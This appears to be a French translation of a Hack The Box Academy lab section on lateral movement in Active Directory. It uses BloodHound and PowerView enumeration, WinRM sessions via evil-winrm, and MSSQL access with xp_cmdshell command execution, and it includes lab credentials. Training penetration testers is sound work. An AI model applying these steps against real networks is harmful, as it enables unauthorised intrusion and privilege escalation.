Accès privilégié
================

* * * * *

Une fois que nous avons pris pied dans le domaine, notre objectif consiste désormais à faire progresser notre position en nous déplaçant latéralement ou verticalement pour obtenir l'accès à d'autres hôtes, et éventuellement à compromettre le domaine ou à atteindre un autre objectif, en fonction de l'objectif de l'évaluation. Pour y parvenir, il existe plusieurs façons de se déplacer latéralement. Généralement, si nous prenons en charge un compte doté de droits d'administrateur local sur un hôte ou un ensemble d'hôtes, nous pouvons effectuer une `Pass-the-Hash`attaque pour nous authentifier via le protocole SMB.

`But what if we don't yet have local admin rights on any hosts in the domain?`

Il existe plusieurs autres façons de se déplacer dans un domaine Windows :

-   `Remote Desktop Protocol`( `RDP`) - est un protocole d'accès/de gestion à distance qui nous donne un accès GUI à un hôte cible

-   [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2) - également appelé accès PSRemoting ou Windows Remote Management (WinRM), est un protocole d'accès à distance qui nous permet d'exécuter des commandes ou d'entrer dans une session de ligne de commande interactive sur un hôte distant à l'aide de PowerShell.

-   `MSSQL Server`- un compte doté des privilèges d'administrateur système sur une instance SQL Server peut se connecter à l'instance à distance et exécuter des requêtes sur la base de données. Cet accès peut être utilisé pour exécuter des commandes du système d'exploitation dans le contexte du compte de service SQL Server via diverses méthodes

Nous pouvons énumérer cet accès de diverses manières. Le plus simple, encore une fois, est via BloodHound, car les bords suivants existent pour nous montrer de quels types de privilèges d'accès à distance dispose un utilisateur donné :

-   [CanRDP](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)
-   [CanPSRemote](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)
-   [Administrateur SQL](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)

Nous pouvons également énumérer ces privilèges à l'aide d'outils tels que PowerView et même d'outils intégrés.

* * * * *

Configuration du scénario
-------------------------

Dans cette section, nous allons alterner entre un hôte d'attaque Windows et Linux au fur et à mesure que nous étudions les différents exemples. Vous pouvez générer les hôtes de cette section à la fin de cette section et RDP dans l'hôte d'attaque Windows MS01. Pour la partie de cette section qui nécessite une interaction d'un hôte Linux ( `mssqlclient.py`et `evil-winrm`), vous pouvez ouvrir une console PowerShell sur MS01 et SSH `172.16.5.225`avec les informations d'identification `htb-student:HTB_@cademy_stdnt!`. Nous vous recommandons d'essayer toutes les méthodes présentées dans cette section (c'est-à-dire `Enter-PSSession`depuis `PowerUpSQL`l'hôte d'attaque Windows et `evil-winrm`depuis `mssqlclient.py`l'hôte d'attaque Linux).

* * * * *

Bureau à distance
-----------------

Généralement, si nous contrôlons un utilisateur administrateur local sur une machine donnée, nous pourrons y accéder via RDP. Parfois, nous prendrons pied auprès d'un utilisateur qui ne dispose de droits d'administrateur local nulle part, mais qui possède les droits de RDP sur une ou plusieurs machines. Cet accès pourrait nous être extrêmement utile car nous pourrions utiliser le poste d'hôte pour :

-   Lancer d'autres attaques
-   Nous pourrons peut-être élever les privilèges et obtenir les informations d'identification d'un utilisateur privilégié plus élevé.
-   Nous pourrons peut-être piller l'hôte pour des données ou des informations d'identification sensibles

En utilisant PowerView, nous pourrions utiliser la fonction [Get-NetLocalGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-NetLocalGroupMember/) pour commencer à énumérer les membres du `Remote Desktop Users`groupe sur un hôte donné. Vérifions le `Remote Desktop Users`groupe sur l' `MS01`hôte dans notre domaine cible.

#### Énumération du groupe d'utilisateurs du Bureau à distance

  Accès privilégié

```
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Desktop Users
MemberName   : INLANEFREIGHT\Domain Users
SID          : S-1-5-21-3842939050-3880317879-2865463114-513
IsGroup      : True
IsDomain     : UNKNOWN

```

À partir des informations ci-dessus, nous pouvons voir que tous les utilisateurs du domaine (c'est-à-dire `all`les utilisateurs du domaine) peuvent RDP vers cet hôte. Il est courant de voir cela sur les hôtes des services Bureau à distance (RDS) ou sur les hôtes utilisés comme hôtes de saut. Ce type de serveur pourrait être largement utilisé et nous pourrions potentiellement trouver des données sensibles (telles que des informations d'identification) qui pourraient être utilisées pour approfondir notre accès, ou nous pourrions trouver un vecteur d'élévation de privilèges local qui pourrait conduire à un accès administrateur local et au vol d'informations d'identification. prise de contrôle de compte pour un utilisateur avec plus de privilèges dans le domaine. Généralement, la première chose que je vérifie après avoir importé les données BloodHound est :

Le groupe Utilisateurs du domaine dispose-t-il de droits d'administrateur local ou de droits d'exécution (tels que RDP ou WinRM) sur un ou plusieurs hôtes ?

#### Vérification des droits d'administration et d'exécution locaux du groupe d'utilisateurs du domaine à l'aide de BloodHound

![image](https://academy.hackthebox.com/storage/modules/143/bh_RDP_domain_users.png)

Si nous prenons le contrôle d'un utilisateur via une attaque telle que LLMNR/NBT-NS Response Spoofing ou Kerberoasting, nous pouvons rechercher le nom d'utilisateur dans BloodHound pour vérifier de quel type de droits d'accès à distance il dispose soit directement, soit hérité via l'appartenance à un groupe sous `Execution Rights`sur le `Node Info`languette.

#### Vérification des droits d'accès à distance à l'aide de BloodHound

![image](https://academy.hackthebox.com/storage/modules/143/execution_rights.png)

Nous pourrions également consulter l' `Analysis`onglet et exécuter les requêtes prédéfinies `Find Workstations where Domain Users can RDP`ou `Find Servers where Domain Users can RDP`. Il existe d'autres moyens d'énumérer ces informations, mais BloodHound est un outil puissant qui peut nous aider à affiner ces types de droits d'accès rapidement et avec précision, ce qui est extrêmement bénéfique pour nous en tant que testeurs d'intrusion soumis à des contraintes de temps pour la période d'évaluation. Cela peut également être utile pour l'équipe bleue pour auditer périodiquement les droits d'accès à distance dans l'environnement et détecter les problèmes à grande échelle tels que tous les utilisateurs de domaine ayant un accès involontaire à un hôte ou auditer les droits d'utilisateurs/groupes spécifiques.

Pour tester cet accès, nous pouvons soit utiliser un outil tel que `xfreerdp`ou `Remmina`depuis notre VM ou la Pwnbox soit `mstsc.exe`en attaquant depuis un hôte Windows.

* * * * *

WinRM
-----

Comme RDP, nous pouvons constater qu'un utilisateur spécifique ou un groupe entier dispose d'un accès WinRM à un ou plusieurs hôtes. Il peut également s'agir d'un accès à faible privilège que nous pourrions utiliser pour rechercher des données sensibles ou tenter d'augmenter les privilèges, ou encore entraîner un accès administrateur local, qui pourrait potentiellement être exploité pour élargir notre accès. On peut à nouveau utiliser la fonction PowerView `Get-NetLocalGroupMember`pour le `Remote Management Users`groupe. Ce groupe existe depuis l'époque de Windows 8/Windows Server 2012 pour activer l'accès WinRM sans accorder de droits d'administrateur local.

#### Énumération du groupe d'utilisateurs de gestion à distance

  Accès privilégié

```
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Management Users
MemberName   : INLANEFREIGHT\forend
SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
IsGroup      : False
IsDomain     : UNKNOWN

```

Nous pouvons également utiliser cette coutume `Cypher query`dans BloodHound pour rechercher des utilisateurs disposant de ce type d'accès. Cela peut être fait en collant la requête dans la `Raw Query`case en bas de l'écran et en appuyant sur Entrée.

Code : chiffre

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

```

#### Utilisation de la requête Cypher dans BloodHound

![image](https://academy.hackthebox.com/storage/modules/143/canpsremote_bh_cypherq.png)

Nous pourrions également l'ajouter en tant que requête personnalisée à notre installation BloodHound, afin qu'elle soit toujours disponible pour nous.

#### Ajout de la requête Cypher en tant que requête personnalisée dans BloodHound

![image](https://academy.hackthebox.com/storage/modules/143/user_defined_query.png)

Nous pouvons utiliser l' applet de commande [Enter-PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2) en utilisant PowerShell à partir d'un hôte Windows.

#### Établir une session WinRM à partir de Windows

  Accès privilégié

```
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred

[ACADEMY-EA-DB01]: PS C:\Users\forend\Documents> hostname
ACADEMY-EA-DB01
[ACADEMY-EA-DB01]: PS C:\Users\forend\Documents> Exit-PSSession
PS C:\htb>

```

Depuis notre hôte d'attaque Linux, nous pouvons utiliser l'outil [evil-winrm](https://github.com/Hackplayers/evil-winrm) pour nous connecter.

Pour l'utiliser `evil-winrm`, nous pouvons l'installer à l'aide de la commande suivante :

#### Installation d'Evil-WinRM

  Accès privilégié

```
dsgsec@htb[/htb]$ gem install evil-winrm

```

En tapant, `evil-winrm`nous obtiendrons le menu d'aide et toutes les commandes disponibles.

#### Affichage du menu d'aide d'Evil-WinRM

  Accès privilégié

```
dsgsec@htb[/htb]$ evil-winrm

Evil-WinRM shell v3.3

Error: missing argument: ip, user

Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -N, --no-rpath-completion        Disable remote path completion
    -l, --log                        Log the WinRM session
    -h, --help                       Display this help message

```

Nous pouvons nous connecter avec simplement une adresse IP et des informations d'identification valides.

#### Connexion à une cible avec Evil-WinRM et des informations d'identification valides

  Accès privilégié

```
dsgsec@htb[/htb]$ evil-winrm -i 10.129.201.234 -u forend

Enter Password:

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\forend.INLANEFREIGHT\Documents> hostname
ACADEMY-EA-MS01

```

De là, nous pourrions creuser pour planifier notre prochain déménagement.

* * * * *

Administrateur du serveur SQL
-----------------------------

Le plus souvent, nous rencontrerons des serveurs SQL dans les environnements auxquels nous sommes confrontés. Il est courant de trouver des comptes d'utilisateurs et de services configurés avec des privilèges d'administrateur système sur une instance de serveur SQL donnée. Nous pouvons obtenir des informations d'identification pour un compte avec cet accès via Kerberoasting (commun) ou d'autres tels que LLMNR/NBT-NS Response Spoofing ou la pulvérisation de mot de passe. Une autre façon de trouver les informations d'identification du serveur SQL consiste à utiliser l'outil [Snaffler](https://github.com/SnaffCon/Snaffler) pour rechercher web.config ou d'autres types de fichiers de configuration contenant des chaînes de connexion au serveur SQL.

BloodHound, encore une fois, est un excellent pari pour trouver ce type d'accès via le `SQLAdmin`edge. Nous pouvons rechercher `SQL Admin Rights`dans l' `Node Info`onglet un utilisateur donné ou utiliser cette requête Cypher personnalisée pour rechercher :

Code : chiffre

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2

```

Ici, nous voyons un utilisateur qui `damundsen`a `SQLAdmin`des droits sur l'hôte `ACADEMY-EB-DB01`.

#### Utilisation d'une requête de chiffrement personnalisée pour vérifier les droits d'administrateur SQL dans BloodHound

![image](https://academy.hackthebox.com/storage/modules/143/sqladmins_bh.png)

Nous pouvons utiliser nos droits ACL pour nous authentifier auprès de l' `wley`utilisateur, modifier le mot de passe de l' `damundsen`utilisateur, puis nous authentifier auprès de la cible à l'aide d'un outil tel que `PowerUpSQL`, qui dispose d'un [aide-mémoire de commande](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet) pratique . Supposons que nous ayons modifié le mot de passe du compte pour `SQL1234!`utiliser nos droits ACL. Nous pouvons désormais authentifier et exécuter des commandes du système d'exploitation.

Tout d'abord, recherchons les instances de serveur SQL.

#### Énumération des instances MSSQL avec PowerUpSQL

  Accès privilégié

```
PS C:\htb> cd .\PowerUpSQL\
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain

ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccountSid : 1500000521000170152142291832437223174127203170152400
DomainAccount    : damundsen
DomainAccountCn  : Dana Amundsen
Service          : MSSQLSvc
Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
LastLogon        : 4/6/2022 11:59 AM

```

Nous pourrions ensuite nous authentifier auprès de l'hôte du serveur SQL distant et exécuter des requêtes personnalisées ou des commandes du système d'exploitation. Cela vaut la peine d'expérimenter cet outil, mais les tactiques d'énumération et d'attaque approfondies contre MSSQL sortent du cadre de ce module.

  Accès privilégié

```
PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

VERBOSE: 172.16.5.150,1433 : Connection Success.

Column1
-------
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...

```

Nous pouvons également nous authentifier depuis notre hôte d'attaque Linux en utilisant [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) de la boîte à outils Impacket.

#### Affichage des options mssqlclient.py

  Accès privilégié

```
dsgsec@htb[/htb]$ mssqlclient.py

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

usage: mssqlclient.py [-h] [-port PORT] [-db DB] [-windows-auth] [-debug] [-file FILE] [-hashes LMHASH:NTHASH]
                      [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address]
                      target

TDS client implementation (SSL supported).

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

<SNIP>

```

#### Exécution de mssqlclient.py par rapport à la cible

  Accès privilégié

```
dsgsec@htb[/htb]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands

```

Une fois connectés, nous pourrions taper `help`pour voir quelles commandes sont disponibles.

#### Affichage de nos options avec accès au serveur SQL

  Accès privilégié

```
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd

```

On pourrait alors choisir `enable_xp_cmdshell`d'activer la [procédure stockée xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) qui permet d'exécuter des commandes du système d'exploitation via la base de données si le compte en question dispose des droits d'accès appropriés.

#### Choisir activate_xp_cmdshell

  Accès privilégié

```
SQL> enable_xp_cmdshell

[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

```

Enfin, nous pouvons exécuter des commandes au format `xp_cmdshell <command>`. Ici, nous pouvons énumérer les droits dont dispose notre utilisateur sur le système et voir que nous disposons de [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) , qui peut être exploité en combinaison avec un outil tel que [JuicyPotato](https://github.com/ohpe/juicy-potato) , [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) ou [RoguePotato](https://github.com/antonioCoco/RoguePotato) pour passer au `SYSTEM`niveau de privilèges, en fonction de l'hôte cible, et utiliser cet accès pour continuer vers notre objectif. Ces méthodes sont couvertes dans `SeImpersonate and SeAssignPrimaryToken`le module [Windows Privilege Escalation](https://academy.hackthebox.com/course/preview/windows-privilege-escalation) . Essayez-les sur cette cible si vous souhaitez vous entraîner davantage !

#### Énumération de nos droits sur le système à l'aide de xp_cmdshell

  Accès privilégié

```
xp_cmdshell whoami /priv
output

--------------------------------------------------------------------------------

NULL

PRIVILEGES INFORMATION

----------------------

NULL

Privilege Name                Description                               State

============================= ========================================= ========

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled

SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled

SeImpersonatePrivilege        Impersonate a client after authentication Enabled

SeCreateGlobalPrivilege       Create global objects                     Enabled

SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

NULL

```

* * * * *

Passer à autre chose
--------------------

Cette section a démontré quelques techniques de mouvement latéral possibles dans un environnement Active Directory. Nous devrions toujours rechercher ce type de droits lorsque nous prenons pied pour la première fois et prenons le contrôle de comptes d'utilisateurs supplémentaires. N'oubliez pas qu'énumérer et attaquer est un processus itératif ! Chaque fois que nous prenons le contrôle d'un autre utilisateur/hôte, nous devons répéter certaines étapes d'énumération pour voir quels nouveaux droits et privilèges nous avons obtenus, le cas échéant. Ne négligez jamais les droits d'accès à distance si l'utilisateur n'est pas un administrateur local sur l'hôte cible, car nous pourrions très probablement accéder à un hôte sur lequel nous trouvons des données sensibles, ou nous pouvons élever les privilèges.

Enfin, chaque fois que nous trouvons des informations d'identification SQL (dans un script, un fichier web.config ou un autre type de chaîne de connexion à une base de données), nous devons tester l'accès sur tous les serveurs MSSQL de l'environnement. Ce type d'accès est `SYSTEM`un accès presque garanti sur un hôte. Si nous pouvons exécuter des commandes avec le compte avec lequel nous nous authentifions, il aura presque toujours le `SeImpersonatePrivilege`droit dangereux.

La section suivante abordera un problème courant que nous rencontrons souvent lors de l'utilisation de WinRM pour se connecter aux hôtes du réseau.
